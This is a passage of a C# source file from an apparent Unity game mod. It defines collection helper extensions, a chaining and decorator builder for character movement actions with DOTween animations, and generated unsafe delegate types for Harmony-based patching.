﻿using CustomMapUtility;
using DG.Tweening;
using HarmonyLib;
using MonoMod.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using UnityEngine;
using static Don_Eyuil.MovingActionTools.ChainingMovingAction;
using static Don_Eyuil.MovingActionTools.DOTWeenMovingAction;
using static Don_Eyuil.MovingActionTools.MovingActionManager;
using static RencounterManager;
namespace Don_Eyuil
{

    public static class ValueTupleTools
    {
        public static ValueTuple<TSource, TSource> Do<TSource>(this ValueTuple<TSource, TSource> tuple, Action<TSource> Act1, Action<TSource> Act2)
        {
            Act1(tuple.Item1); Act2(tuple.Item2);
            return tuple;
        }
    }
    public static class ChainingIEnumerableTools
    {
        public static IEnumerable<T> ChainingDo<T>(this IEnumerable<T> sequence, Action<T, int> action)
        {
            if (sequence != null)
            {
                int index = -1;
                IEnumerator<T> enumerator = sequence.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    index = checked(index + 1);
                    action(enumerator.Current, index);
                }
            }
            return sequence;
        }
        public static IEnumerable<T> ChainingDo<T>(this IEnumerable<T> sequence, Action<T> action)
        {
            if (sequence != null)
            {
                IEnumerator<T> enumerator = sequence.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    action(enumerator.Current);
                }
            }
            return sequence;
        }
        public static IEnumerable<T> ChainingDoIf<T>(this IEnumerable<T> sequence, Func<T, bool> condition, Action<T, int> action)
        {
            return sequence.Where(condition).ChainingDo(action);
        }
        public static IEnumerable<T> ChainingDoIf<T>(this IEnumerable<T> sequence, Func<T, int, bool> condition, Action<T, int> action)
        {
            return sequence.Where(condition).ChainingDo(action);
        }
        public static IEnumerable<T> ChainingInsertRanges<T>(this IEnumerable<T> sequence, int index, params IEnumerable<T>[] collection)
        {
            collection?.ChainingDo((x) => sequence.ToList().InsertRange(index, x));
            return sequence;
        }
        public static IEnumerable<T> ChainingRemove<T>(this IEnumerable<T> sequence, T item)
        {
            sequence.ToList().Remove(item);
            return sequence;
        }
        public static IEnumerable<T> ChainingRemove<T>(this IEnumerable<T> sequence, int index)
        {
            sequence.ToList().RemoveAt(index);
            return sequence;
        }
        public static IEnumerable<T> ChainingRemove<T>(this IEnumerable<T> sequence, int index, int range)
        {
            sequence.ToList().RemoveRange(index, range);
            return sequence;
        }
        public static IEnumerable<T> ChainingRemove<T>(this IEnumerable<T> sequence, Predicate<T> match)
        {
            sequence.ToList().RemoveAll(match);
            return sequence;
        }
        public static IEnumerable<T> ChainingSort<T>(this IEnumerable<T> sequence, Comparison<T> comparison)
        {
            sequence.ToList().Sort(comparison);
            return sequence;
        }
    }
    public static class DivisibleIEnumerableTools
    {
        //在这个类中所有的方法都默认：使用ValueTuple时 Item1为符合条件(Predicate或count)的值 Item2为不符合的
        //即：DivisibleTake(2)时 Item1为1,2项(因为其符合<=2的条件) Item2为3,4...项
        //最好使用Item1? Item2?用来避免null的情况
        public static (IEnumerable<TSource>, IEnumerable<TSource>) SplitDivisibleIEnumerable<TSource>(this IEnumerable<(TSource, TSource)> source)
        {
            return (source.Select(x => { return x.Item1; }), source.Select(x => { return x.Item2; }));
        }

        public static IEnumerable<(TSource, TSource)> DivisibleSkipWhile<TSource>(this IEnumerable<TSource> source, Func<TSource, int, bool> predicate)
        {
            int index = -1;
            foreach (TSource item in source)
            {
                index = checked(index + 1);
                if (!predicate(item, index))
                {
                    yield return (item, default(TSource));
                }
                else
                {
                    yield return (default(TSource), item);
                }
            }
        }
    }
    public static class MovingActionTools
    {
        public class MovingActionManager : IMovingActionManager
        {
            public interface IMovingActionManager
            {
                MovingAction _movingAction { get; set; }
                List<MovingAction> _baseMovingActions { get; set; }
                void Push();
            }
            public MovingAction _movingAction { get; set; }
            public List<MovingAction> _baseMovingActions { get; set; }

            protected readonly IMovingActionManager _movingActionDecorater;
            public MovingActionManager(MovingAction movingAction, List<MovingAction> baseMovingActions)
            {
                _movingAction = movingAction; _baseMovingActions = baseMovingActions;
            }
            public MovingActionManager(IMovingActionManager movingActionDecorater)
            {
                _movingActionDecorater = movingActionDecorater;
                _movingAction = movingActionDecorater?._movingAction;
                _baseMovingActions = movingActionDecorater?._baseMovingActions;
            }

            //C->(CP->BP)->B->(BP->AP)->A->P
            public virtual void Push()
            {
                if (_movingActionDecorater != null) { _movingActionDecorater.Push(); }
                else
                {
                    _baseMovingActions.Add(_movingAction);
                }
            }
            public class MovingAction_CustomMovingEventSetter : MovingActionManager
            {
                private bool _Interval = false;
                public MovingAction_CustomMovingEventSetter(IMovingActionManager movingActionDecorater, bool interval = false) : base(movingActionDecorater)
                {
                    _Interval = interval;
                }
                public virtual MovingAction.MoveCustomEventWithElapsed MergeMoveFunc()
                {
                    return (float deltaTime, float elapsedTime) => { return true; };
                }
                public override void Push()
                {
                    MovingAction.MoveCustomEventWithElapsed baseMoveFunc = (AccessTools.Field(typeof(MovingAction), "_moveFunc").GetValue(_movingAction) as MovingAction.MoveCustomEventWithElapsed) ?? new MovingAction.MoveCustomEventWithElapsed((float deltaTime, float elapsedTime) => { return true; });
                    MovingAction.MoveCustomEventWithElapsed newMoveFunc = MergeMoveFunc();
                    float latestElapsedTime = 0f;
                    _movingAction?.SetCustomMoving((float deltaTime, float elapsedTime) =>
                    {
                        if (newMoveFunc != baseMoveFunc)
                        {
                            if (newMoveFunc(deltaTime, elapsedTime))
                            {
                                newMoveFunc = baseMoveFunc;
                                latestElapsedTime = elapsedTime;
                                if (!_Interval) { newMoveFunc(deltaTime, 0); }
                                ;
                            }
                        }
                        else
                        {
                            return newMoveFunc(deltaTime, elapsedTime - latestElapsedTime);
                        }
                        return false;
                    });
                    base.Push();
                }
                sealed public class MovingAction_CustomMovingEventActionManager : MovingAction_CustomMovingEventSetter
                {
                    private Queue<MovingAction.MoveCustomEventWithElapsed> _moveFuncQueue = new Queue<MovingAction.MoveCustomEventWithElapsed> { };
                    public MovingAction_CustomMovingEventActionManager(IMovingActionManager movingActionDecorater, MovingAction.MoveCustomEventWithElapsed[] moveFuncs, bool interval = false) : base(movingActionDecorater, interval)
                    {
                        moveFuncs?.DoIf(x => x.Method.HasMethodBody(), y => _moveFuncQueue.Enqueue(y));
                    }
                    public MovingAction_CustomMovingEventActionManager(IMovingActionManager movingActionDecorater, MovingAction.MoveCustomEvent[] moveFuncs, bool interval = false) : base(movingActionDecorater, interval)
                    {
                        moveFuncs?.DoIf(x => x.Method.HasMethodBody(), y => _moveFuncQueue.Enqueue(((float deltaTime, float elapsedTime) => y(deltaTime))));
                    }
                    public override MovingAction.MoveCustomEventWithElapsed MergeMoveFunc()
                    {
                        float latestElapsedTime = 0f;
                        return (deltaTime, elapsedTime) =>
                        {
                            if (_moveFuncQueue.Count > 0)
                            {
                                if (_moveFuncQueue.Peek()(deltaTime, elapsedTime - latestElapsedTime))
                                {
                                    _moveFuncQueue.Dequeue();
                                    latestElapsedTime = elapsedTime;
                                    if (!_Interval && _moveFuncQueue.Count > 0) { _moveFuncQueue.Peek()(deltaTime, 0); }
                                    ;
                                }
                            }
                            else
                            {
                                return true;
                            }
                            return false;
                        };
                    }
                }
                sealed public class MovingAction_DOTWeenActionManager : MovingAction_CustomMovingEventSetter
                {
                    private DG.Tweening.Sequence _DOTWeenSequence;
                    public MovingAction_DOTWeenActionManager(IMovingActionManager movingActionDecorater, Queue<Tween> DOTWeens, bool interval = false) : base(movingActionDecorater, interval)
                    {
                        _DOTWeenSequence = _DOTWeenSequence ?? DOTween.Sequence();
                        foreach (Tween tween in DOTWeens)
                        {
                            _DOTWeenSequence.Append(tween);
                        }
                        _DOTWeenSequence.Pause();
                    }
                    public MovingAction_DOTWeenActionManager(IMovingActionManager movingActionDecorater, DG.Tweening.Sequence DOTWeens, bool interval = false) : base(movingActionDecorater, interval)
                    {
                        _DOTWeenSequence = DOTWeens;
                        _DOTWeenSequence.Pause();
                    }
                    public override MovingAction.MoveCustomEventWithElapsed MergeMoveFunc()
                    {
                        bool _HasStartedPlaying = false;
                        bool _HasFinishedPlaying = false;
                        return (deltaTime, elapsedTime) =>
                        {
                            if (!_HasStartedPlaying)
                            {
                                Debug.Log("这是DOTWeen执行");
                                _DOTWeenSequence.Play();
                                _HasStartedPlaying = true;
                                _DOTWeenSequence.onComplete += () => { _HasFinishedPlaying = true; Debug.Log("这是DOTWeen在委托里执行"); };
                            }
                            return _HasFinishedPlaying;
                        };
                    }
                }

            }
        }
        sealed public class ChainingMovingAction : IChainingMovingAction
        {
            public interface IChainingMovingAction
            {
                IMovingActionManager _movingActionManager { get; set; }
                void Finish();
            }
            public IMovingActionManager _movingActionManager { get; set; }
            public ChainingMovingAction(List<MovingAction> Base, ActionDetail actionDetail, CharMoveState moveState, float dstRatio, bool updateDir, float delay, float speed)
            {
                _movingActionManager = new MovingActionManager(new MovingAction(actionDetail, moveState, dstRatio, updateDir, delay, speed), Base ?? new List<MovingAction>() { });
            }
            public void Finish()
            {
                _movingActionManager?.Push();
            }
        }
        sealed public class DOTWeenMovingAction : IChainingMovingAction, IDOTWeenMovingAction
        {
            public interface IDOTWeenMovingAction : IChainingMovingAction
            {
                IDOTWeenMovingAction AppendDOTween(params Tween[] tweens);
            }
            public IMovingActionManager _movingActionManager { get; set; }
            private Queue<Tween> _DOTWeenQueue = new Queue<Tween> { };
            public DOTWeenMovingAction(IMovingActionManager movingActionManager)
            {
                _movingActionManager = movingActionManager;
            }
            public void Finish()
            {
                this.WithMovingActionDecorator(new MovingAction_CustomMovingEventSetter.MovingAction_DOTWeenActionManager(_movingActionManager, _DOTWeenQueue));
                _movingActionManager?.Push();
            }
            public IDOTWeenMovingAction AppendDOTween(params Tween[] tweens)
            {
                tweens.Do(x => _DOTWeenQueue.Enqueue(x.Pause()));
                return this;
            }
        }
        //---------------------------------装饰器部分--------------------------------------------------------//
        public static IChainingMovingAction WithMovingActionDecorator(this IChainingMovingAction baseAction, IMovingActionManager movingActionDecorator)
        {
            baseAction._movingActionManager = movingActionDecorator;
            return baseAction;
        }

        //---------------------------------定义流控制部分--------------------------------------------------------//
        public static IChainingMovingAction Start(this List<MovingAction> managedList, ActionDetail actionDetail, CharMoveState moveState, float dstRatio = 1f, bool updateDir = true, float delay = 0.125f, float speed = 1f)
        {
            return new ChainingMovingAction(managedList, actionDetail, moveState, dstRatio, updateDir, delay, speed);
        }
        public static IChainingMovingAction Finish(this IChainingMovingAction baseAction)
        {
            baseAction.Finish();
            return baseAction;
        }
        public static IChainingMovingAction Next(this IChainingMovingAction baseAction, List<MovingAction> managedList, ActionDetail actionDetail, CharMoveState moveState, float dstRatio = 1f, bool updateDir = true, float delay = 0.125f, float speed = 1f)
        {
            baseAction.Finish();
            return new ChainingMovingAction(managedList, actionDetail, moveState, dstRatio, updateDir, delay, speed);
        }
        public static IChainingMovingAction Start(this IChainingMovingAction baseAction, List<MovingAction> managedList, ActionDetail actionDetail, CharMoveState moveState, float dstRatio = 1f, bool updateDir = true, float delay = 0.125f, float speed = 1f)
        {
            baseAction.Finish();
            return new ChainingMovingAction(managedList, actionDetail, moveState, dstRatio, updateDir, delay, speed);
        }
        public static IChainingMovingAction SetEffectTiming(this IChainingMovingAction baseAction, EffectTiming atk, EffectTiming recover, EffectTiming damaged)
        {
            baseAction._movingActionManager?._movingAction?.SetEffectTiming(atk, recover, damaged);
            return baseAction;
        }
        public static IChainingMovingAction WithCustomMoving(this IChainingMovingAction baseAction, params RencounterManager.MovingAction.MoveCustomEventWithElapsed[] m)
        {
            return baseAction.WithMovingActionDecorator(new MovingAction_CustomMovingEventSetter.MovingAction_CustomMovingEventActionManager(baseAction._movingActionManager, m));
        }
        public static IChainingMovingAction WithCustomMoving(this IChainingMovingAction baseAction, params RencounterManager.MovingAction.MoveCustomEvent[] m)
        {
            return baseAction.WithMovingActionDecorator(new MovingAction_CustomMovingEventSetter.MovingAction_CustomMovingEventActionManager(baseAction._movingActionManager, m));
        }
        public static IChainingMovingAction WithCustomMoving(this IChainingMovingAction baseAction, bool interval, params RencounterManager.MovingAction.MoveCustomEventWithElapsed[] m)
        {
            return baseAction.WithMovingActionDecorator(new MovingAction_CustomMovingEventSetter.MovingAction_CustomMovingEventActionManager(baseAction._movingActionManager, m, interval));
        }
        public static IChainingMovingAction WithCustomMoving(this IChainingMovingAction baseAction, bool interval, params RencounterManager.MovingAction.MoveCustomEvent[] m)
        {
            return baseAction.WithMovingActionDecorator(new MovingAction_CustomMovingEventSetter.MovingAction_CustomMovingEventActionManager(baseAction._movingActionManager, m, interval));
        }
        //---------------------------------DOTWeen部分--------------------------------------------------------//
        public static IDOTWeenMovingAction WithDOTWeen(this IChainingMovingAction baseAction, params Tween[] tweens)
        {
            Debug.Log("这是DOTWeen");
            return new DOTWeenMovingAction(baseAction._movingActionManager).AppendDOTween(tweens);
        }
        //确保在最好情况下一条定义流只维护一个DOTWeen装饰器以减少开销
        public static IDOTWeenMovingAction WithDOTWeen(this IDOTWeenMovingAction baseAction, params Tween[] tweens)
        {
            return baseAction?.AppendDOTween(tweens);
        }
    }
    /*public static class MovingActionTools
    {
        public interface IChainingMovingAction
        {
            MovingActionManager _movingActionManager { get; set; }
            void Finish();
        }
        public interface IDOTWeenMovingAction:IChainingMovingAction
        {
            Queue<Tween> _tweenQueue { get; set; }
        }
        sealed public class MovingActionManager
        {
            public MovingAction _movingAction { get; set; }
            public List<MovingAction> _baseMovingActions { get; set; }
            public RencounterManager.MovingAction.MoveCustomEventWithElapsed _moveCustomEvent { get; set; }
            public MovingActionManager(MovingAction movingAction, List<MovingAction> baseMovingActions)
            {
                _movingAction = movingAction; _baseMovingActions = baseMovingActions;
            }
            public void Push()
            {
                if (_moveCustomEvent != null) { _movingAction.SetCustomMoving(_moveCustomEvent); }
                _baseMovingActions.Add(_movingAction);
            }
            public void WithCustomMoving(RencounterManager.MovingAction.MoveCustomEventWithElapsed m)
            {
                _moveCustomEvent = (_moveCustomEvent == null) ? m : (_moveCustomEvent + m);
            }
        }
        sealed public class ChainingMovingAction : IChainingMovingAction
        {
            public MovingActionManager _movingActionManager { get; set; }
            public ChainingMovingAction(List<MovingAction> Base, ActionDetail actionDetail, CharMoveState moveState, float dstRatio, bool updateDir, float delay, float speed)
            {
                _movingActionManager = new MovingActionManager(new MovingAction(actionDetail, moveState, dstRatio, updateDir, delay, speed), Base ?? new List<MovingAction>() { });
            }
            public void Finish()
            {
                _movingActionManager?.Push();
            }
        }
        sealed public class DOTWeenMovingAction : IChainingMovingAction, IDOTWeenMovingAction
        {
            public MovingActionManager _movingActionManager { get; set; }
            public Queue<Tween> _tweenQueue { get; set; }
            public DOTWeenMovingAction(MovingActionManager movingActionManager,Tween tween)
            {
                _movingActionManager = movingActionManager;
                _tweenQueue = _tweenQueue ?? new Queue<Tween>() { };
                _tweenQueue.Enqueue(tween);
            }
            public DOTWeenMovingAction(MovingActionManager movingActionManager,params Tween[] tweens)
            {
                _movingActionManager = movingActionManager;
                _tweenQueue = _tweenQueue ?? new Queue<Tween>() { };
                tweens.Do(x =>  _tweenQueue.Enqueue(x));
            }
            public void Finish()
            {
                _movingActionManager?.Push();
            }
        }
        public static IChainingMovingAction Start(this List<MovingAction> managedList, ActionDetail actionDetail, CharMoveState moveState, float dstRatio = 1f, bool updateDir = true, float delay = 0.125f, float speed = 1f)
        {
            return new ChainingMovingAction(managedList, actionDetail, moveState, dstRatio, updateDir, delay, speed);
        }
        public static IChainingMovingAction Finish(this IChainingMovingAction baseAction)
        {
            baseAction.Finish();
            //Debug.LogError("MovingActionTools:ManageFlowPushedSuccessfully");
            return baseAction;
        }
        public static IChainingMovingAction Next(this IChainingMovingAction baseAction, List<MovingAction> managedList, ActionDetail actionDetail, CharMoveState moveState, float dstRatio = 1f, bool updateDir = true, float delay = 0.125f, float speed = 1f)
        {
            baseAction.Finish();
            return new ChainingMovingAction(managedList, actionDetail, moveState, dstRatio, updateDir, delay, speed);
        }
        public static IChainingMovingAction Start(this IChainingMovingAction baseAction, List<MovingAction> managedList, ActionDetail actionDetail, CharMoveState moveState, float dstRatio = 1f, bool updateDir = true, float delay = 0.125f, float speed = 1f)
        {
            baseAction.Finish();
            return new ChainingMovingAction(managedList, actionDetail, moveState, dstRatio, updateDir, delay, speed);
        }
        public static IChainingMovingAction SetEffectTiming(this IChainingMovingAction baseAction, EffectTiming atk, EffectTiming recover, EffectTiming damaged)
        {
            baseAction._movingActionManager?._movingAction?.SetEffectTiming(atk, recover, damaged); 
            return baseAction;
        }
        public static IChainingMovingAction WithCustomMoving(this IChainingMovingAction baseAction, RencounterManager.MovingAction.MoveCustomEventWithElapsed m)
        {
            baseAction._movingActionManager.WithCustomMoving(m);
            //baseAction._movingActionManager?._movingAction?.SetCustomMoving(m);
            return baseAction;
        }
        public static IChainingMovingAction WithCustomMoving(this IChainingMovingAction baseAction, RencounterManager.MovingAction.MoveCustomEvent m)
        {
            baseAction._movingActionManager.WithCustomMoving(((float deltaTime, float elapsedTime) => m(deltaTime)));
            //baseAction._movingActionManager?._movingAction?.SetCustomMoving(m);
            return baseAction;
        }
        //-------------------------------DOTWEEN部分开始---------------------------------------------------------//
        public static IDOTWeenMovingAction WithDOTWeen(this IChainingMovingAction baseAction,Tween tween)
        { 
            return new DOTWeenMovingAction(baseAction._movingActionManager,tween);
        }
        public static IDOTWeenMovingAction WithDOTWeen(this IChainingMovingAction baseAction,params Tween[] tweens)
        {
            return new DOTWeenMovingAction(baseAction._movingActionManager, tweens);
        }
    }*/

    public static class PatchTools
    {
        public static class UnmanagedDelegateTypes
        {
            public static void Inner_UnmanagedDelegateTypesBuilder(int ArgNum)
            {
                IEnumerable<IEnumerable<T>> GetCombinations<T>(IEnumerable<T> elements, int k)
                {
                    return k == 0 ? new[] { new T[0] } :
                           elements.SelectMany((e, i) =>
                               GetCombinations(elements.Skip(i + 1), k - 1).Select(c => new[] { e }.Concat(c)));
                }
                for (int i = 1; i <= 5; i++)
                {
                    string GenereDeclare = "in T";
                    for (int GeneC = 0; GeneC < i - 1; GeneC++)
                    {
                        GenereDeclare += ",in T" + (GeneC + 1);
                    }
                    string ArgDeclare = "";
                    List<int> N = Enumerable.Range(1, i).ToList();
                    for (int m = 1; m <= N.Count; m++)
                    {
                        var combinations = GetCombinations(N, m);
                        foreach (var combination in combinations)
                        {
                            ArgDeclare = "";
                            for (int q = 1; q <= N.Count; q++)
                            {
                                ArgDeclare += $",T{(q - 1 != 0 ? (q - 1).ToString() : "")}{(combination.Any(x => x == q) ? "*" : "")} A{(q - 1 != 0 ? (q - 1).ToString() : "")}";
                            }
                            Console.WriteLine($"public unsafe delegate void UnmanagedDelegate_{String.Join("", combination)}<{GenereDeclare}>({ArgDeclare.Substring(1)});");
                        }
                    }
                    ArgDeclare = "";
                    for (int q = 1; q <= N.Count; q++)
                    {
                        ArgDeclare += $",T{(q - 1 != 0 ? (q - 1).ToString() : "")} A{(q - 1 != 0 ? (q - 1).ToString() : "")}";
                    }
                    Console.WriteLine($"public unsafe delegate void UnmanagedDelegate<{GenereDeclare}>({ArgDeclare.Substring(1)});");
                }
            }
            public static void Inner_UnmanagedDelegateTypes_WithRetBuilder(int ArgNum)
            {
                IEnumerable<IEnumerable<T>> GetCombinations<T>(IEnumerable<T> elements, int k)
                {
                    return k == 0 ? new[] { new T[0] } :
                           elements.SelectMany((e, i) =>
                               GetCombinations(elements.Skip(i + 1), k - 1).Select(c => new[] { e }.Concat(c)));
                }
                for (int i = 1; i <= 5; ArgNum++)
                {
                    string GenereDeclare = "out TResult,in T";
                    for (int GeneC = 0; GeneC < i - 1; GeneC++)
                    {
                        GenereDeclare += ",in T" + (GeneC + 1);
                    }
                    string ArgDeclare = "";
                    List<int> N = Enumerable.Range(1, i).ToList();
                    for (int m = 1; m <= N.Count; m++)
                    {
                        var combinations = GetCombinations(N, m);
                        foreach (var combination in combinations)
                        {
                            ArgDeclare = "";
                            for (int q = 1; q <= N.Count; q++)
                            {
                                ArgDeclare += $",T{(q - 1 != 0 ? (q - 1).ToString() : "")}{(combination.Any(x => x == q) ? "*" : "")} A{(q - 1 != 0 ? (q - 1).ToString() : "")}";
                            }
                            Console.WriteLine($"public unsafe delegate void UnmanagedDelegateWithRet_{String.Join("", combination)}<{GenereDeclare}>({ArgDeclare.Substring(1)});");
                        }
                    }
                    ArgDeclare = "";
                    for (int q = 1; q <= N.Count; q++)
                    {
                        ArgDeclare += $",T{(q - 1 != 0 ? (q - 1).ToString() : "")} A{(q - 1 != 0 ? (q - 1).ToString() : "")}";
                    }
                    Console.WriteLine($"public unsafe delegate void UnmanagedDelegateWithRet<{GenereDeclare}>({ArgDeclare.Substring(1)});");
                }
            }
            public unsafe delegate TResult UnmanagedDelegateWithRet_1<out TResult, in T>(T* A);
            public unsafe delegate TResult UnmanagedDelegateWithRet<out TResult, in T>(T A);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1<out TResult, in T, in T1>(T* A, T1 A1);
            public unsafe delegate TResult UnmanagedDelegateWithRet_2<out TResult, in T, in T1>(T A, T1* A1);
            public unsafe delegate TResult UnmanagedDelegateWithRet_12<out TResult, in T, in T1>(T* A, T1* A1);
            public unsafe delegate TResult UnmanagedDelegateWithRet<out TResult, in T, in T1>(T A, T1 A1);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1<out TResult, in T, in T1, in T2>(T* A, T1 A1, T2 A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet_2<out TResult, in T, in T1, in T2>(T A, T1* A1, T2 A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet_3<out TResult, in T, in T1, in T2>(T A, T1 A1, T2* A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet_12<out TResult, in T, in T1, in T2>(T* A, T1* A1, T2 A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet_13<out TResult, in T, in T1, in T2>(T* A, T1 A1, T2* A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet_23<out TResult, in T, in T1, in T2>(T A, T1* A1, T2* A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet_123<out TResult, in T, in T1, in T2>(T* A, T1* A1, T2* A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet<out TResult, in T, in T1, in T2>(T A, T1 A1, T2 A2);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1<out TResult, in T, in T1, in T2, in T3>(T* A, T1 A1, T2 A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_2<out TResult, in T, in T1, in T2, in T3>(T A, T1* A1, T2 A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_3<out TResult, in T, in T1, in T2, in T3>(T A, T1 A1, T2* A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_4<out TResult, in T, in T1, in T2, in T3>(T A, T1 A1, T2 A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_12<out TResult, in T, in T1, in T2, in T3>(T* A, T1* A1, T2 A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_13<out TResult, in T, in T1, in T2, in T3>(T* A, T1 A1, T2* A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_14<out TResult, in T, in T1, in T2, in T3>(T* A, T1 A1, T2 A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_23<out TResult, in T, in T1, in T2, in T3>(T A, T1* A1, T2* A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_24<out TResult, in T, in T1, in T2, in T3>(T A, T1* A1, T2 A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_34<out TResult, in T, in T1, in T2, in T3>(T A, T1 A1, T2* A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_123<out TResult, in T, in T1, in T2, in T3>(T* A, T1* A1, T2* A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_124<out TResult, in T, in T1, in T2, in T3>(T* A, T1* A1, T2 A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_134<out TResult, in T, in T1, in T2, in T3>(T* A, T1 A1, T2* A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_234<out TResult, in T, in T1, in T2, in T3>(T A, T1* A1, T2* A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1234<out TResult, in T, in T1, in T2, in T3>(T* A, T1* A1, T2* A2, T3* A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet<out TResult, in T, in T1, in T2, in T3>(T A, T1 A1, T2 A2, T3 A3);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3 A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_2<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3 A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_3<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_4<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_5<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_12<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3 A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_13<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_14<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_15<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_23<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_24<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_25<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_34<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_35<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_45<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_123<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_124<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_125<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_134<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_135<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_145<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_234<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_235<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_245<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_345<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3* A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1234<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1235<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1245<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_1345<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3* A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_2345<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3* A3, T4* A4);
            public unsafe delegate TResult UnmanagedDelegateWithRet_12345<out TResult, in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3* A3, T4* A4);
